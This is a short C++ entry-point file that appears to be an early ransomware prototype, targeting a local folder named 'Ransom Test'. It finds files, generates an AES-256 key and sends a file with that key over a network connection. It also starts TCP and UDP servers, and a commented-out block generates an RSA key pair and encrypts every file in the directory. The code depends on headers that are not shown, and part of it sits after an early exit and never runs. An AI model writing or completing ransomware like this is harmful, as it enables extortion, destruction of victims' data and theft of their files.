#include "ServerInterface.h"
#include "FileManager.h"

#include <csignal>

bool abortApp = false;

void SignalHandler(int signal) {
    abortApp = true;
}

int main() {
    FileManager fileMgr;
    fileMgr.FindFiles("C:\\Users\\ethan\\Desktop\\Ransom Test\\");

    BYTESTRING key = LGCrypto::Generate256AESKey();

    NetworkManager netMgr;
    netMgr.SendFile(fileMgr.GetFile(0), 0, key);

    exit(1);

    ServerInterface server(5454, 4820); // make a tcp server on port 5454 and start it
    
    signal(SIGINT, SignalHandler);

    Server tcp = server.GetTCPServer();
    Server udp = server.GetUDPServer();
    
    std::cout << "Created TCP and UDP servers" << std::endl;

    server.StartServer(tcp);
    server.StartServer(udp);

    while ( 1 ) {
        if ( abortApp ) {
            server.~ServerInterface();
            return 0;
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }

    return 0;
}

// encrypting files in a directory
// std::string cwd = "C:\\Users\\ethan\\Desktop\\Ransom Test";
// RSAKeys keys = LGCrypto::GenerateRSAPair(2048);
// 
// FileManager mgr;
// mgr.SetPrivateKey(keys.priv);
// mgr.SetPublicKey(keys.pub);
// 
// mgr.TransformFiles(cwd, &FileManager::EncryptContents, mgr);
// mgr.TransformFiles(cwd, &FileManager::DecryptContents, mgr);
